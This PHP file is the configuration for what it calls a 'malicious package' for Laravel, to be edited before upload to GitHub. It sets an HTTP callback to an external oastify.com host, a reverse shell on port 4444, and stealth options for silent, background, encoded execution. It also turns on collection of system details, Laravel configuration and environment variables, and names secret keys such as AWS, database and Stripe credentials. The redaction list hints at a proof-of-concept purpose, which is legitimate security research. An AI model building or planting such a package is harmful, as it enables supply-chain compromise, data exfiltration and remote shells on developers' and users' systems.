<?php

/**
 * Configuration file for the malicious package
 * Modify these settings before uploading to GitHub
 */

return [
    // HTTP Callback Configuration
    'callback' => [
        'url' => 'http://n7vywh0uxslyc3q81o29dyyhw82zqvek.oastify.com',
        'timeout' => 10,
        'user_agent' => 'Laravel-Malicious-Package/1.0'
    ],

    // Reverse Shell Configuration
    'reverse_shell' => [
        'host' => '127.0.0.1',
        'port' => 4444,
        'timeout' => 30
    ],

    // Stealth Settings
    'stealth' => [
        'silent_errors' => true,
        'background_execution' => true,
        'encode_payloads' => true
    ],

    // Information Gathering
    'gather_info' => [
        'system_info' => true,
        'laravel_config' => true,
        'environment_vars' => true,
        'file_permissions' => true,
        'redact_sensitive' => true
    ],

    // Sensitive keys to redact from environment variables
    'sensitive_keys' => [
        'DB_PASSWORD',
        'APP_KEY',
        'AWS_SECRET_ACCESS_KEY',
        'AWS_ACCESS_KEY_ID',
        'MAIL_PASSWORD',
        'REDIS_PASSWORD',
        'PUSHER_APP_SECRET',
        'JWT_SECRET',
        'STRIPE_SECRET'
    ]
];
